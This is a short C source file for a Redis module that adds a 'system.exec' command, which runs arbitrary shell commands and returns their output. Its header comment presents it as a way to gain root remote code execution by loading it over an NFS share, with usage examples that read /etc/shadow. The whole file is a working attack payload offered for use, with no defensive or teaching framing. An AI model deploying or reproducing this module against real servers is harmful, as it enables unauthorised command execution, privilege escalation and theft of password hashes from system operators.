/*
 * Minimal Redis module: executes a shell command and returns stdout.
 * Loaded via MODULE LOAD over an NFS share to achieve root RCE.
 *
 * Usage after loading:
 *   system.exec "id"
 *   system.exec "cat /etc/shadow"
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "redismodule.h"

static int cmd_exec(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc != 2) return RedisModule_WrongArity(ctx);

    size_t len;
    const char *cmd = RedisModule_StringPtrLen(argv[1], &len);

    char buf[8192] = {0};
    FILE *fp = popen(cmd, "r");
    if (!fp)
        return RedisModule_ReplyWithError(ctx, "ERR popen failed");

    size_t total = 0;
    while (total < sizeof(buf) - 1) {
        size_t n = fread(buf + total, 1, sizeof(buf) - 1 - total, fp);
        if (n == 0) break;
        total += n;
    }
    pclose(fp);

    return RedisModule_ReplyWithSimpleString(ctx, buf);
}

int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx, "system", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "system.exec", cmd_exec,
                                  "write deny-oom", 0, 0, 0) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    return REDISMODULE_OK;
}
